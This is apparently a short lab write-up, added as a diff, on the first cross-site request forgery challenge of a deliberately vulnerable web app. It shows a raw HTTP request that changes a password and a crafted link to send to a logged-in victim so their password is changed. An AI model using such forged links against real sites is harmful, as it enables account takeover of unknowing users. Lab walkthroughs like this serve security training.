@@ -1,0 +1,18 @@
+In this first challenge the endpoint to change password is not protected at all. Consider the following request, which is a valid request to change one's password
+
+GET /vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change HTTP/1.1
+Host: evil
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://evil/vulnerabilities/csrf/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=etov4q0s936tquopvb3b56app0; security=low
+Connection: close
+
+Simply send the following link to an authenticated user and you will force them to change their password with the password of your choosing
+
+http://evil/vulnerabilities/csrf/?password_new=newpass&password_conf=newpass&Change=Change
